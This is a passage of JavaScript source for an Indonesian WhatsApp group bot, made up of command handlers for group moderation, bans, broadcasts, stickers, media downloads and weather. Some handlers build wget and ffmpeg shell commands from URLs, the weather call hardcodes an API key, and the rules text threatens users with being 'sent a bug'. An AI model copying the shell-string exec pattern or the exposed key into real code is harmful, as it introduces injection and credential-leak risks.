	
	case 'closetime': 
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.badmin)
	if (args[1]=="detik") {var timer = args[0]*`1000`
	} else if (args[1]=="menit") {var timer = args[0]*`60000`
	} else if (args[1]=="jam") {var timer = args[0]*`3600000`
	} else if (args[1]=="hari") {var timer = args[0]*`86400000`
	} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
	setReply(`Close time ${q} dimulai dari sekarang`)
	setTimeout( () => {
	var nomor = dev.participant
	const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
	conn.groupSettingUpdate(from, 'announcement')
	setReply(close)
	}, timer)
	break
					
					
	case 'opentime':        
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.badmin)
	if (args[1]=="detik") {var timer = args[0]*`1000`
	} else if (args[1]=="menit") {var timer = args[0]*`60000`
	} else if (args[1]=="jam") {var timer = args[0]*`3600000`
	} else if (args[1]=="hari") {var timer = args[0]*`86400000`
	} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
	setReply(`Open time ${q} dimulai dari sekarang`)
	setTimeout( () => {
	var nomor = dev.participant
	const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
	conn.groupSettingUpdate(from, 'not_announcement')
	setReply(open)
	}, timer)
	break
	
	
	case 'tourl': {
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	if(isAllMedia || isQuotedImage || isQuotedAudio || isQuotedVideo ||  isQuotedSticker){  
	let anu = await uploadFile (media)
	reply (anu)
	} else {
  setReply(`Kirim gambar dengan caption ${prefix+command} atau reply gambar/sticker`)
       }
	await fs.unlinkSync(media)
	}
	break
	
	
	
	case 'loli': case 'milf': case 'husbu': case 'cosplay': case 'wallml':{
	let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
	let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
	let kentir = await getBuffer(wipi)
	let teks = "Nih"                                          
	conn.sendMessage(from, { image: { url: kentir }}, {quoted: dev})
 }
	break  
	
	case 'chat': {
	if (!isOwner) return setReply(mess.only.owner)
	if (!q) return setReply( 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
	if (args[0] === 'mute') {
	conn.chatModify({ mute: 'Infinity' }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'unmute') {
	conn.chatModify({ mute: null }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'archive') {
	conn.chatModify({  archive: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'unarchive') {
	conn.chatModify({ archive: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'read') {
	conn.chatModify({ markRead: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'unread') {
	conn.chatModify({ markRead: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (args[0] === 'delete') {
	conn.chatModify({ clear: { message: [{ id: dev.quoted.id, fromMe: true }] } }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	} else if (q.startsWith("+") || q.startsWith('08') || q.startsWith('62') ){
	if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
	var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
	var org = q.split("|")[1];
	conn.sendMessage(nomor+'@s.whatsapp.net',{text: org})   
	setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)           
	 }
	 }
	 break
	
	
		

	
	
	
	case 'rules':{
	let teks =`
	Syarat dan Ketentuan menggunakan *${fake}*
	
	1. Nama dan nomer user ${fake}
		 akan Kami simpan di dalam 
		 server selama bot aktif
		 
	2. Data akan di hapus ketika bot Offline
		 atau di hapus oleh Owner Bot
	
	3. Kami tidak menyimpan gambar, 
		 video, file, audio, dan dokumen 
		 yang kamu kirim ke ${fake}
		 
	4. Kami tidak akan pernah meminta users 
		 untuk memberikan informasi pribadi
		 
	5. Jika menemukan Bug/Error silahkan 
		 langsung lapor ke Owner atau Developer
		 atau bisa juga memakai fitur _*reportbug*_
		 
	6. Beberapa fitur mungkin ada yang error, 
		 jadi tunggu sampai developer 
		 meperbaiki fitur tersebut
			 
	8. Bot ini sudah di lengkapi dengan
		 fitur _*Auto Report Bug*_ jika terjadi
		 error maka bot akan auto report ke
		 developer, terkecuali error yang
		 menyebabkan bot mati, maka user
		 harus lapor ke developer
		 
	7. Bot ini juga sudah di lengkapi dengan 
		 Fitur Anti Spam jika kamu terdeteksi 
		 melakukan spam, maka Bot tidak
		 akan menanggapi kamu selama 20 detik
		
	9. User dilarang keras menelpon bot!
		 jika melanggar maka kamu akan terkena 
		 banned,block dan dikirim bug
	
	10. Bot tidak akan menanggapi user yang
		   meminta untuk di save nomernya`
	
	reply(teks)
	}
	break
	  
	
	
	case 'kodebahasa':{
	let LANGUAGES = `
	*╭─❲ KODE BAHASA ❳*
	*│*
	*│▸* af: Afrikaans 
	*│▸* sq: Albanian
	*│▸* ar: Arabic
	*│▸* hy: Armenian
	*│▸* ca: Catalan 
	*│▸* zh: Chinese 
	*│▸* zh-cn: Chinese (Mandarin/China)
	*│▸* zh-tw: Chinese (Mandarin/Taiwan)
	*│▸* zh-yue: Chinese (Cantonese)
	*│▸* hr: Croatian
	*│▸* cs: Czech
	*│▸* da: Danish
	*│▸* nl: Dutch
	*│▸* en: English    
	*│▸* en-au: English (Australia)
	*│▸* en-uk: English (United Kingdom)
	*│▸* en-us: English (United States) 
	*│▸* eo: Esperanto 
	*│▸* fi: Finnish 
	*│▸* fr: French
	*│▸* de: German
	*│▸* el: Greek 
	*│▸* ht: Haitian Creole 
	*│▸* hi: Hindi 
	*│▸* hu: Hungarian 
	*│▸* is: Icelandic 
	*│▸* id: Indonesian 
	*│▸* it: Italian
	*│▸* ja: Japanese
	*│▸* ko: Korean
	*│▸* la: Latin
	*│▸* lv: Latvian
	*│▸* mk: Macedonian
	*│▸* no: Norwegian
	*│▸* pl: Polish
	*│▸* pt: Portuguese
	*│▸* pt-br: Portuguese (Brazil)
	*│▸* ro: Romanian
	*│▸* ru: Russian
	*│▸* sr: Serbian
	*│▸* sk: Slovak
	*│▸* es: Spanish 
	*│▸* es-es: Spanish (Spain)
	*│▸* es-us: Spanish (United States)
	*│▸* sw: Swahili
	*│▸* sv: Swedish
	*│▸* ta: Tamil
	*│▸* th: Thai
	*│▸* tr: Turkish
	*│▸* vi: Vietnamese 
	*│▸* cy: Welsh
	*│*
	*╰────────────⦁*`
	setReply(LANGUAGES)
	}
	break
	
	
	case 'block':
	if (!isOwner) return onlyOwner()
	if(isGroup){
	
	if(users){
	await conn.updateBlockStatus(users, "block")
	setReply(`Sukses block user`)
	} else {
	setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	}
	} else if(!isGroup){
	if(q){
	var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
	if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
	if(!woke.startsWith("62")) return setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	await conn.updateBlockStatus(woke, "block")
	} else if(!q){
	setReply("Masukan nomer yang ingin di block")
	}
	setReply(`Berhasil Block user ${woke.split("@")[0]}`)
	}
	break
	
	case  'unblock':
	if (!isOwner) return onlyOwner()
	if(isGroup){
	if(users){
	await conn.updateBlockStatus(users, "unblock")
	await setReply(`Sukses unblock user`)
	} else if(!q){
	setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	}
	} else if(!isGroup){
	if(q){
	let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
	if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
	if(!woke.startsWith("62")) return setReply("Silakan re�ply pesan atau tag atau input nomer yang mau di block")
	await conn.updateBlockStatus(woke, "unblock")
	setReply(`Sukses unblock ${woke}`)
	} else if(!q){
	setReply("Masukan nomer yang ingin di unblock")
	}
	
	}
	break
	
	
	
	case 'console':{
	if (!isOwner) return onlyOwner()
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (Console === true) return setReply('Udah aktif kak')
	Console = true
	let ih =`Tampilan console telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	 if (Console === false) return setReply('Udah off kak')
	Console = false
	let eh =`Mode auto respon telah di matikan`
	setReply(eh)
	}else if (!q) {
		reply(`MODE CONSOLOE\n${prefix+command} on/off`)
	 }
	 }
	break


  case 'qrcode':{
if (args.length < 1) return reply(`teksnya?\nContoh:\n${prefix + command} https://github.com/`)
const buff = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${encodeURIComponent(q)}`)
await conn.sendMessage(from, {image: buff, caption: `Nih`},{quoted: dev})
}
break

    
	
	case 'weather':{
	if(!args[0]) setReply(" please provide place or location name")
	try{
	let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
	let res = await response
	let name = res.data.name
	let Country = res.data.sys.country
	let Weather= res.data.weather[0].description
	let Temperature = res.data.main.temp + '°C'
	let Minimum_Temperature= res.data.main.temp_min + '°C'
	let Maximum_Temperature= res.data.main.temp_max + '°C'
	let Humidity= res.data.main.humidity + '%'
	let Wind= res.data.wind.speed + 'km/h'
	setReply(`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`)
	}catch(e){
	setReply('Lokasi tidak di temukan, silakan masukan nama negara')
	 }
	 }
	break
	
	
	case 'triggered':
	case 'wasted':
	case 'comrade':
	case 'horny':
	case 'blur':
	case 'pixelate':
	case 'simpcard':
	case 'lolice':
	case 'glass':
	if (isQuotedVideo && dev.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage.fileLength < 10000000 || isQuotedImage || isImage) {
	setReply(mess.wait)
	
	try{
	let { Sticker, StickerTypes } = require('wa-sticker-formatter')
	let olalah = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let anuah = await uploadFile (olalah)
	let media = `https://some-random-api.com/canvas/${command}?avatar=${anuah}`
	await makeSticker(media,Sticker, StickerTypes)
	await fs.unlinkSync(olalah)
	
	} catch (err){  
	let owgi = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let anu = await uploadFile (owgi)
	let ranp = getRandom('.gif')
	let rano = getRandom('.webp')
	let anu4 = `https://some-random-api.com/canvas/${command}?avatar=${anu}`
	exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
	if (err) return setReply(`${err}`)
	await conn.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: dev})
	await fs.unlinkSync(owgi)
	await fs.unlinkSync(ranp)
	await fs.unlinkSync(rano)
	})
	}
	  
	} else if (isQuotedText) {
	setReply(mess.wait)
	
	try{
	let { Sticker, StickerTypes } = require('wa-sticker-formatter')
	let olalah = await conn.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png') 
	let media = `https://some-random-api.com/canvas/${command}?avatar=${olalah}`
	await makeSticker(media,Sticker, StickerTypes)
	await fs.unlinkSync(olalah)
	
	} catch (err){  
	console.log(err)
	let oppp = await conn.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
	let anu4 = `https://some-random-api.com/canvas/${command}?avatar=${oppp}`
	let ranp = getRandom('.gif')
	let rano = getRandom('.webp')
	exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
	if (err) return setReply(`${err}`)
	await conn.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: dev})
	await fs.unlinkSync(oppp)
	await fs.unlinkSync(ranp)
	await fs.unlinkSync(rano)
	})
	}
	}  else {
	setReply('Gunakan foto!')
	}
	break 
	
	
	
	case  'yts':
	try {
	if (!q) return setReply('Format salah')
	setReply(mess.wait)
	let rus = await yts(q)
	let  res = await rus.all.filter(v => v.type == 'video')
	let videoID = res[0].videoId
	
	try{
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
	} catch(err) {
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
	}
	let a = `*Youtube Search 🔎*\n`
	for (let i of res) {
	a += `
	📜 Title : ${i.title}
	📈 Views : ${i.views}
	🌐 Upload : ${i.ago}
	⏱️ Durasi : ${i.timestamp}
	🎥 Channel : ${i.author.name}
	🖇️ Link : ${i.url}\n\n`
	}
	let b = a.trim()
	conn.sendMessage(from, { caption: `${b}`, image: {url: res[0].image}}, {quoted:dev})
	 } catch (e) {
	 console.log(e)
	 setReply(`${e}`)
	}
	break

	
	  case 'setppbot':
	if (!isOwner) return setReply(mess.only.owner)
	if (isImage || isQuotedImage) {
	const media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	const { img } = await generateProfilePicture(media)
	await conn.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})       
	await setReply("Sukses")    
	} else  {
	setReply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
	}
	break


  case 'setppgc':
  if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (isImage || isQuotedImage) {
	const media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	const { img } = await generateProfilePicture(media)
	await conn.query({ tag: 'iq',  attrs: { to: from, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})       
	await setReply("Sukses")    
	} else  {
	setReply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
	}
	break
	
	
	
	
	case 'bc': 
	if (!isOwner) return onlyOwner()
	if (args.length < 1) return reply(`Masukkan isi pesannya`)
	var data = await store.chats.all()
	for (let i of data) {
	await conn.sendMessage(i.id, { text: `${q}\n\n_*BROADCAST MESSAGE*_` })
	await sleep(1000)
	}
	break
	
	
	case 'antiasing':{
  if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
  if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isKickarea) return setReply("Sudah aktif!!");
	db.data.chats[from].antiasing = true
	setReply("Sukses mengaktifkan kickarea!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isKickarea) return setReply("Udah off!!");
	db.data.chats[from].antiasing = false
	setReply("Sukses mematikan kickarea!");
	} else if (!q) {
	reply ( `MODE KICKAREA\n ${prefix+command} on/off`)
	 }
	 }
	break;
						
	
	
	
	case 'antilinkgc':{
    if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
	db.data.chats[from].antilinkgc = true
	let ih =`Fitur antilink group telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntilinkGc) return setReply('Udah mati')
	db.data.chats[from].antilinkgc = false
	let ih =`Fitur antilink group telah di matikan`
	setReply(ih)
	}else if (!q) {
		reply ( `*MODE ANTI LINK GRUB*\n ${prefix+command} on/off`)
	 }
	 }
	break;  
	
	
	case 'antilink':{
    if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
		if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntiLink) return setReply('Fitur sudah aktif kak')
	db.data.chats[from].antilink = true
	let ih =`Fitur antilink telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntiLink) return setReply('Fitur Anti link sudah off')
	db.data.chats[from].antilink = false
	let ih =`Fitur antilink telah di matikan`
	setReply(ih)
	} else if (!q) {
		reply ( `*MODE ANTI LINK*\n ${prefix+command} on/off`)
	}
	}
	break;          
	
	
	
	
	case 'welcome':{
    if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
		if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isWelcome) return setReply('Fitur sudah aktif kak')
	db.data.chats[from].welcome = true
	let ih =`Welcome telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isWelcome) return setReply('Fitur welcome sudah off')
	db.data.chats[from].welcome = false
	let ih =`Fitur Welcome telah di matikan`
	setReply(ih)
	} else if (!q) {
		reply ( `*MODE WELCOME*\n ${prefix+command} on/off`)
	}
	}
	break;          
	
	
	
	
	
	case 'banchat':{
	if (!isOwner) return onlyOwner() 
	if (!isGroup) return setReply(mess.only.group)
	if (isBanchat) return setReply(`udah di ban`)
	db.data.chats[from].banchat = true
	setReply(`Bot berhasil Ban di group ini`)
	}
	break
	
	
	case 'unbanchat':
	if (!isOwner) return onlyOwner() 
	try {
	if (!isBanchat) return setReply(`udah di UnBan`)
	db.data.chats[from].banchat = false
	setReply(`Bot telah di Unban di group ini`)
	} catch (err){
	console.log(err)
	setReply(`${err}`)
	}
	break
				
	

	case 'getidgc': case 'getid':
	if(!isGroup) return setReply("Hanya bisa di group")
 reply(`${from}`)
	break
	
	
	
case 'tt': case 'tiktok': case 'ttnowm': case 'tiktoknowm':  { 
try{  
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(!isUrl) return setReply (`Masukan link tiktok dengan benar\nContoh: ${prefix + command} https://vm.tiktok.com/ZSRfArwXH/`)
if (args.length < 1) return setReply(`Link?\nContoh: ${prefix + command} https://vm.tiktok.com/ZSRfArwXH/`)
setReply (mess.wait) 
let data = await fetchJson (`https://xzn.wtf/api/tiktok?url=${q}&apikey=${apiwtf}`)
if(data.data.duration == 0) {
 for(let i of data.data.images){
await sleep (2000)
conn.sendMedia(from, i, dev)
}
} else {
let tkes = `*------------[ TIKTOKNOWM ]------------*\n\n𖦹 *ID:* ${data.data.id}\n𖦹 *Region:* ${data.data.region}\n𖦹 *Judul:* ${data.data.title}\n𖦹 *Durasi:* ${data.data.duration}\n𖦹 *Music:* ${data.data.music}\n𖦹 *Info Musik:*\n- *Judul:* ${data.data.music_info.title}\n- *Author:* ${data.data.music_info.author}\n𖦹 *Diputar:* ${h2k(data.data.play_count)}\n𖦹 *Jumlah Komentar:* ${data.data.comment_count}\n𖦹 *Jumlah Share:* ${data.data.share_count}\n𖦹 *Didownload:* ${data.data.download_count} kali` 
conn.sendMessage(from, {video: {url: data.data.play}, caption: tkes}, {quoted: dev})
}
} catch (err){
savefrom(q).then(res => {
conn.sendMessage(from, {caption: `*------------[ TIKTOKNOWM ]------------*

• Autor: ${res.meta.source}
${res.meta.title}`, video: {url: res.url[0].url}}, {quoted: dev})
})
 //setReply ('Maaf sistem erorr, coba lgi nanti !!')
//return
}
  }
db.data.users[sender].limit -= 1 // -1 limit
break
						  

case 'tiktokmusik':{       
	if (args.length < 1) return setReply('Link?')
	if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
	if(q.startsWith("https://vt.tiktok.com/")){
	var lin = args[0]
	} else if(q.startsWith("https://vm.tiktok.com/")){
	var lin = args[0]
	} else if(q.startsWith("https://www.tiktok.com/")){
	var lin = args[0]
	} else {
	return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
	}
	setReply(mess.wait)
	Tiktok(lin).then( async res => {
	let ep = res.nowm                    
	let nana = await getBuffer(ep)
	let ran = getRandom('.mp3')
	let ron = getRandom('.mp4')
	fs.writeFileSync(ron, nana)
	exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
	fs.unlinkSync(ron)
	if (err) return setReply(`Err: ${err}`)
	let buffer453 = fs.readFileSync(ran)
	conn.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4'}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	})
	}
	 break
							  
						
						
						
	case 'unblockcmd':
	try{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply("Textnya mana cih")
	if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
	deleteblockcmd(q, listcmdblock)        
	setReply(`Berhasil unblock command 「 *${q}* 」`)
	} catch (err) {
	setReply("Bjirr error, keknya ada yang error")
	}
	break  
				
	case 'blockcmd':
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
	if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
	addblockcmd(q,listcmdblock)         
	setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
	break
	
	
	case 'listblockcmd':{
	let wo = `*「 LIST BLOCK CMD 」*`
	let soso = [];
	for (let i of listcmdblock) {
	soso.push(i.cmd)
	wo += `\n\n•> Command : ${i.cmd}`
	}
	setReply(wo)
	}
	break  
	
	
	case 'infogc': {
	if(!isGroup) return setReply("Hanya bisa di dalam group")
	let _meta = await conn.groupMetadata(from)
	  console.log(_meta)
	let _img = await conn.profilePictureUrl(_meta.id, 'image') 

let caption = `*G R O U P I N F O*

*System* 
Anti Link gc : *${isAntilinkGc ? 'Aktif✅' : 'Mati❌'}*
Anti Link : *${isAntiLink ? 'Aktif✅' : 'Mati❌'}*
Anti Virtex : *${isAntiVirtex ? 'Aktif✅' : 'Mati❌'}*
Anti Wame : *${isAntiWame ? 'Aktif✅' : 'Mati❌'}*
Anti Asing : *${isKickarea ? 'Aktif✅' : 'Mati❌'}*
Anti Delete : *${isAntidelete ? 'Aktif✅' : 'Mati❌'}*

༆ *Name :* ${_meta.subject}
༆ *ID Grup :* ${_meta.id}
༆ *Dibuat :* ${moment(_meta.creation * 1000).format('ll')}
༆ *Owner Grup :* ${_meta.subjectOwner}
༆ *Jumlah Admin :* ${_meta.participants.filter(x => x.admin === 'admin').length}
༆ *Jumlah Peserta :* ${_meta.participants.filter(x => x.admin === null).length}
༆ *Desc :* 
${_meta.desc}`

	await conn.sendMessage(from,{
	caption,
	image: await getBuffer(_img)
	},
	{ quoted: dev }
	)
	}
	break

    
	case 'info':{
	const si = require('systeminformation');
	let OsInfo = await si.osInfo()
	let System = await si.system()
	let Cpu = await si.cpu()
	let Mem = await si.mem()
	
	let {platform,distro,release,codename,kernel,arch,hostname,fqdn,codepage,logofile} = OsInfo
	let { manufacturer,brand,vendor,family,model,stepping,revision,voltage,speed,speedMin,speedMax,governor,cores,physicalCores,processors} = Cpu
	let { total,free,used,active,available,buffers,cached,slab,buffcache} = Mem
	
	let teks =`System Information`
	 teks +=`
	
	Uptime : ${kyun(os.uptime())}
	
	*OS INFO*
	Platform: ${platform}
	Distro: ${distro}
	Release: ${release}
	Codename: ${codename}
	Kernel: ${kernel}
	Arch: ${arch}
	Hostname: ${hostname}
	Codepage: ${codepage}
	
	*CPU INFO*
	Manufacturer: ${manufacturer}
	Brand: ${brand}
	Vendor: ${vendor}
	Family: ${family}
	Model: ${model}
	Speed: ${speed} Ghz
	Governor: ${governor}
	Cores: ${cores}
	PhysicalCores: ${physicalCores}
	Processors: ${processors}
	
	*MEMORY INFO*
	Memory : ${FileSize(used)}/${FileSize(total)} 
	Free : ${FileSize(free)}
	Cached: ${FileSize(cached)}
	`
	setReply(teks)
	 }    
	break    
	
		
	
	
	case 'setprefix':
		{
	if (!isOwner) return onlyOwner()
	let teks =`SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
	if (q === 'multi'){
	multi = true
	nopref = false
	setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
	} else if (q === 'nopref'){
	multi = false
	nopref = true
	setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
	} else if (q === 'allpref'){
	multi = false
	nopref = false
	allpref = true
	setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
	} else if (!q) {
	reply ( `*SET PREFIX*\n ${prefix+command} multi/nopref/allpref`)
	 } else {
	multi = false
	nopref = false
	prefa = `${q}`
	setReply(`Berhasil anying mengubah prefix ke *「 ${q} 」*`)
	 } 
	}
	break  
	
	
	case 'setreply':{
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
	if(replyType === "web") return setReply("Udah aktif")
	replyType = "web"
	setReply(`Berhasil mengubah set reply ke ${q}`)
	}  else if ((args[0]) === 'mess'){
	if(replyType === "mess") return setReply("Udah aktif")
	replyType = "mess"
	setReply(`Berhasil mengubah set reply ke ${q}`)
	} else if (!q) {
	reply ( `*SETTING REPLY*\n ${prefix+command} mess/web`)
	 } else {
	replyType = q
	 setReply("Set Reply Tidak Di Temukan")
	}
	}
	break
	
	
	
	
	
	
	
	
	
	case 'take': case 'swm':{
	if (isImage || isQuotedImage|| isQuotedSticker) {
	try{
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `yoy`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await conn.sendMessage(from,{sticker: nah},{quoted: dev})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
	} catch (err){
	console.log(err)
	}
	}
}
	break
	
	
	
	
	
		case 'ban':{
			let alasan = ""
			if (!isOwner)return setReply('hanya owner') 
			if (q.startsWith("+")) {
			let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
			let Name = await conn.getName(woke)
			if(cekBannedUser (woke, ban)) return setReply("Udah di ban kak")
			addBanned(Name,calender,woke,alasan, ban)          
			setReply( `Berhasil banned ${woke}`);
			} else  if(users){
			let alasan = mentionByReply? q : mentionByTag? q.split(" ")[1] : "" 
			if(alasan == undefined) alasan = "Tidak ada"
			let Nomer = `${users.split("@")[0]}`
			if(cekBannedUser (Nomer, ban)) return setReply("Udah di ban kak")
			let Name = await conn.getName(users)
			//if(Nomer === ownerNumber[0]) return setReply("Ga mau") 
			addBanned(Name,calender,Nomer,alasan, ban)               
			setReply( `Berhasil banned ${users.split("@")[0]}`);
			} else setReply('Reply atau tag targetnya')
			}
			break
	
		
			case 'unban':{
				if (!isOwner)return setReply('hanya owner') 
				if (q.startsWith("+")) {
				let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
				if(!cekBannedUser (woke, ban)) return setReply("Udah di unban kak")
				unBanned (woke, ban)             
				setReply( `Berhasil unbanned ${woke}`);
				} else  if(users){
				let Nomer =`${users.split("@")[0]}`
				if(!cekBannedUser (Nomer, ban)) return setReply("Udah di unban kak")
				//if(Nomer === Ownerin) return setReply("Ga mau")
				unBanned (Nomer, ban)             
				setReply( `Berhasil unbanned ${users.split("@")[0]}`);
				} else setReply('Reply atau tag targetnya')
				}
				break
	
	case 'listban':
//if (!isOwner) return onlyOwner()
let banya = `*List Banned*\nJumlah : ${ban.length}\n\n`
ban.map(function(e, i){
banya +=(i+1)+`. Nomer : wa.me/${e.id}\n└▸ Tanggal : ${e.date}\n└▸ Alasan : ${e.reason} \n\n`            
 });
setReply(banya)
break
	
	
	case 'clearallban':{
	if (!isOwner) return onlyOwner()
	setReply("Sukses clear all ban")
	let nana = Object.keys(db.data.users)
	let obj = []
	for(let i of nana){
	if(db.data.users[i].banned.status) db.data.users[i].banned.status = false
	}
	}
	break 
	
	case 'adderror':
	{
		if (!isOwner) return onlyOwner() 
	if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
	if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
	let oke = q.split("|")[0]
	let oka = q.split("|")[1]
	addError(oke, oka, listerror)
	await setReply(`Sukses Menambahkan ${q} ke daftar error`)
	}
	break
	
	
	case 'clearallerror':
	if (!isOwner) return onlyOwner()
	setReply("SukseS clear all error")
	clearAllError(listerror)
	break 
	
	case 'delerror':{
